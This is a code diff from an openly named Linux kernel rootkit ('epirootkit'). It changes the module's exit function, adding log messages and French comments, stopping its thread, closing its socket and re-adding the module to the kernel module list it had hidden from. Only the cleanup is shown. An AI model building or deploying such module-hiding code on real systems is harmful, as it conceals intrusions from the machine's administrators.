@@ -95,26 +95,31 @@ static int __init epirootkit_init(void) {
 }
 
 static void __exit epirootkit_exit(void) {
-    pr_info("epirootkit: Cleaning up...\n");
+    pr_info("epirootkit: Cleaning up module...\n");
 
+    // Nettoyage du thread en premier
     if (g_thread) {
+        pr_info("epirootkit: Stopping thread...\n");
         kthread_stop(g_thread);
         g_thread = NULL;
     }
 
+    // Nettoyage de la socket ensuite
     if (g_sock) {
+        pr_info("epirootkit: Closing socket...\n");
         sock_release(g_sock);
         g_sock = NULL;
-    }
-
-    if (connection_state) {
         notify_connection_state(0);
     }
 
-    if (prev_module) {
+    // Restauration du module dans la liste si nécessaire
+    if (prev_module && THIS_MODULE) {
+        pr_info("epirootkit: Unhiding module...\n");
         list_add(&THIS_MODULE->list, prev_module);
         prev_module = NULL;
     }
+
+    pr_info("epirootkit: Cleanup complete\n");
 }
 
 module_init(epirootkit_init);
